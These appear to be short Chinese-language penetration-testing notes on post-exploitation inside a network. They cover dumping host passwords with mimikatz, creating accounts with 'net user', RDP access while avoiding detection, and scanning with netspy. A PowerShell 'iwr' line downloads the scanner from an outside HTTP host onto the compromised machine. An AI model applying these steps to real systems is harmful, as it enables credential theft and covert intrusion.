# 内网渗透

---

## 远程登录

拿到 shell 之后需要登录的话可以用 `mimikatz` 之类的工具尝试获取主机密码, 如果能拿到明文密码的话就能够远程登录了

或者用 `net user` 命令创建新用户来进行登录(不过相比直接拿原有账密的密码而言, 这种操作太容易被发现了(⊙x⊙;))

- 选择合适的实际直接 RDP 过去是一种可行的方案, 不过默认情况下 Windows 只允许一个用户通过远程桌面连接登录, 如果挤掉了其他远程连接用户的话那么就被发现了

  > Win7 下拿到 shell 之后似乎可以通过在命令行中通过修改系统注册表来实现
  >
  > [How to enable multiple logon remote desktop in Windows 7 - Super User](https://superuser.com/questions/64171/how-to-enable-multiple-logon-remote-desktop-in-windows-7)

- Telnet

- SSH

- Powershell Remoting

- 第三方远程工具, 如 TeamViewer, VNC, PC Anywhere

> 除了 RDP 这一常用功能外, 其他的工具都或多或少需要在远控主机上进行相应的配置, 容易留下痕迹, 因此按下不表

---

## 内网信息收集

走代理扫描容易丢包, 推荐将扫描工具上传后扫描

---

### netspy

> netspy是一款快速探测内网可达网段工具(深信服深蓝实验室天威战队强力驱动) 

可以在 [Releases · shmilylty/netspy (github.com)](https://github.com/shmilylty/netspy/releases) 下载可执行文件压缩包


```
iwr -Uri http://100.1.1.138:8000/download/netspy.exe -OutFile netspy.exe
```


